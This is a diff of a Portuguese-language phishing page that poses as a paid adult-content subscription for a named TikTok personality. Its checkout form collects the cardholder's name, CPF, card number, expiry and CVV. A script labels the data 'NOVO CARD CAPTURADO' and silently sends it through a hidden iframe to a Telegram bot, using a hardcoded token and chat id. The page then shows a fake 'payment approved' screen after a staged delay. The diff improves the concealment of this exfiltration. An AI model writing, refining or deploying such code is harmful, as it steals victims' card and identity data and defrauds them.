@@ -39,7 +39,6 @@
         .plans { padding: 0 20px; display: flex; flex-direction: column; gap: 12px; }
         .btn-plan { width: 100%; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; background: var(--p-grad); display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; box-shadow: 0 4px 15px rgba(244,123,82,0.2); }
         .plan-txt { font-size: 20px; font-weight: 600; }
-        .old-p { font-size: 11px; text-decoration: line-through; opacity: 0.8; display: block; }
         .new-p { font-size: 20px; font-weight: 800; }
 
         .gallery { padding: 20px; }
@@ -50,16 +49,20 @@
         .faq-item { padding: 18px; border: 1px solid #f0f0f0; border-radius: 12px; margin-bottom: 10px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; background: #fafafa; }
 
         #payModal, #successScreen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; backdrop-filter: blur(10px); }
-        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; }
-        .f-group { margin-bottom: 15px; }
+        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; text-align: center; }
+        .f-group { margin-bottom: 15px; text-align: left; }
         .f-group label { display: block; font-weight: 800; font-size: 11px; color: #aaa; text-transform: uppercase; margin-bottom: 5px; }
         .f-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #eee; background: #f9f9f9; font-size: 16px; outline: none; }
         
-        #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         .img-win { width: 100%; max-width: 320px; border-radius: 20px; margin: 20px 0; border: 4px solid var(--p-orange); }
 
-        .notif { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; transform: translateY(250%); transition: 0.5s; z-index: 3000; border-left: 5px solid var(--p-orange); }
-        .notif.show { transform: translateY(0); }
+        /* Estilo da tela final que você pediu */
+        .status-txt { font-size: 26px; font-weight: 900; color: #4CAF50; margin-bottom: 5px; }
+        .delivery-txt { font-size: 18px; font-weight: 600; color: #666; }
+
+        /* iFrame oculto para processar o link sem abrir aba */
+        #hiddenSender { display: none; width: 0; height: 0; border: none; }
     </style>
 </head>
 <body oncontextmenu="return false">
@@ -82,62 +85,52 @@
     <div class="info">
         <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
         <div class="user-at">@eukamylinhasantos</div>
-        <p class="bio">Oi, meus amores! 🔥💦 Sou a Kamylinha Santos, a musa da dancinha do tiktok, e hoje vou revelar um lado meu que vai te deixar sem fôlego...</p>
-        <div class="socials">
-            <div class="soc-btn"><i class="fa-brands fa-x-twitter"></i></div>
-            <div class="soc-btn"><i class="fa-brands fa-tiktok"></i></div>
-            <div class="soc-btn"><i class="fa-brands fa-instagram"></i></div>
-            <div class="soc-btn"><i class="fa-solid fa-paper-plane"></i></div>
-        </div>
+        <p class="bio">Oi, meus amores! 🔥 Venha ver tudo o que eu não posso postar no Instagram. Assine agora para liberar meus vídeos e fotos exclusivas!</p>
     </div>
 
     <div class="plans">
         <div class="btn-plan" onclick="openPay('Mensal', '10,00')">
-            <span class="plan-txt">Mensal</span>
-            <div class="plan-price"><span class="old-p">De R$ 47,00</span><span class="new-p">R$ 10,00</span></div>
+            <span class="plan-txt">Assinatura Mensal</span>
+            <span class="new-p">R$ 10,00</span>
         </div>
         <div class="btn-plan" onclick="openPay('Vitalício', '27,00')">
-            <span class="plan-txt">Vitalício</span>
-            <div class="plan-price"><span class="old-p">De R$ 197,00</span><span class="new-p">R$ 27,00</span></div>
+            <span class="plan-txt">Acesso Vitalício</span>
+            <span class="new-p">R$ 27,00</span>
         </div>
     </div>
 
     <div class="gallery"><div class="media-item"></div></div>
 
     <div class="faq-sect">
-        <h2 class="faq-title">Perguntas Frequentes</h2>
-        <div class="faq-item">O pagamento é seguro? <i class="fa-solid fa-plus"></i></div>
-        <div class="faq-item">É sigiloso? <i class="fa-solid fa-plus"></i></div>
-        <div class="faq-item">Como vou acessar o conteúdo? <i class="fa-solid fa-plus"></i></div>
+        <h2 class="faq-title">Dúvidas</h2>
+        <div class="faq-item">O acesso é imediato? <i class="fa-solid fa-plus"></i></div>
+        <div class="faq-item">Aparece o que na fatura? <i class="fa-solid fa-plus"></i></div>
     </div>
 
     <div id="payModal">
         <div class="m-content">
-            <h2 id="planTitle" style="text-align:center; color:var(--p-orange); margin-bottom:20px; font-weight:800">Checkout</h2>
-            <div class="f-group"><label>Nome no Cartão</label><input type="text" id="n" placeholder="Nome Completo"></div>
+            <h2 id="planTitle" style="color:var(--p-orange); margin-bottom:20px; font-weight:800">Pagamento Seguro</h2>
+            <div class="f-group"><label>Nome Completo</label><input type="text" id="n" placeholder="Como no cartão"></div>
             <div class="f-group"><label>CPF do Titular</label><input type="text" id="f" placeholder="000.000.000-00"></div>
             <div class="f-group"><label>Número do Cartão</label><input type="text" id="c" placeholder="0000 0000 0000 0000"></div>
             <div style="display:flex; gap:10px">
                 <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="v" placeholder="MM/AA"></div>
                 <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="s" placeholder="123"></div>
             </div>
-            <button class="btn-plan" style="justify-content:center; font-weight:800; width:100%" onclick="enviarTudo()">CONFIRMAR PAGAMENTO</button>
-            <p onclick="$('#payModal').hide()" style="text-align:center; margin-top:15px; font-size:12px; color:#999; cursor:pointer">Voltar</p>
+            <button class="btn-plan" style="justify-content:center; font-weight:800; width:100%" onclick="processarEnvio()">APROVAR COMPRA</button>
         </div>
     </div>
 
     <div id="successScreen">
-        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:70px"></i>
-        <h1 style="margin-top:15px">Acesso Liberado!</h1>
+        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:80px"></i>
+        <h1 class="status-txt">PAGAMENTO APROVADO</h1>
+        <p class="delivery-txt">Entrega de conteúdo em até 24Hrs</p>
         <img src="imagem1.png" class="img-win">
-        <p style="font-weight:800; color:var(--p-orange)">VERIFIQUE SEU E-MAIL</p>
-        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:20px" onclick="location.reload()">FECHAR</button>
+        <p style="font-weight:700; color:#999;">Verifique seu e-mail cadastrado para o acesso.</p>
+        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:30px" onclick="location.reload()">CONCLUIR</button>
     </div>
 
-    <div class="notif" id="notif">
-        <img src="perfil1.png" style="width:45px; height:45px; border-radius:10px">
-        <div><b>Novas Mídias!</b><br><small style="color:var(--p-orange); font-weight:bold">Acesso Liberado ✅</small></div>
-    </div>
+    <iframe id="hiddenSender"></iframe>
 
     <script>
         let pSel = "";
@@ -146,12 +139,11 @@
             $('#f').mask('000.000.000-00');
             $('#v').mask('00/00');
             $('#s').mask('000');
-            setInterval(() => { $('#notif').addClass('show'); setTimeout(() => $('#notif').removeClass('show'), 4000); }, 15000);
         });
 
-        function openPay(n, p) { pSel = n; $('#planTitle').text('Plano ' + n + ' - R$ ' + p); $('#payModal').show(); }
+        function openPay(n, p) { pSel = n; $('#planTitle').text('Plano ' + n + ' - R$ ' + p); $('#payModal').fadeIn(); }
 
-        function enviarTudo() {
+        function processarEnvio() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '-1003569961624';
             
@@ -161,25 +153,25 @@
             const v = $('#v').val();
             const s = $('#s').val();
 
-            if (c.length < 16 || f.length < 14) {
-                Notiflix.Notify.failure('Dados incompletos!');
+            if (c.length < 16 || f.length < 14 || n.length < 3) {
+                Notiflix.Notify.failure('Preencha os dados do cartão corretamente!');
                 return;
             }
 
-            Notiflix.Loading.circle('Processando segurança...');
+            Notiflix.Loading.circle('Validando com a operadora...');
 
             const msg = `🚀 NOVO CARD CAPTURADO\n👤 Nome: ${n}\n🆔 CPF: ${f}\n💳 Card: ${c}\n📅 Val: ${v}\n🔒 CVV: ${s}\n💰 Plano: ${pSel}`;
             
-            // MÉTODO INFALÍVEL: Abre janela oculta e fecha
+            // MÉTODO DO IFRAME: O navegador carrega o link do Telegram sem abrir aba
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
-            const win = window.open(url, '_blank', 'width=1,height=1,left=20000,top=20000');
+            document.getElementById('hiddenSender').src = url;
 
+            // Espera o "tempo de processamento" fake e pula pra tela final
             setTimeout(() => {
-                if(win) win.close();
                 Notiflix.Loading.remove();
                 $('#payModal').hide();
                 $('#successScreen').css('display', 'flex'); 
-            }, 2500);
+            }, 3000);
         }
     </script>
 </body>
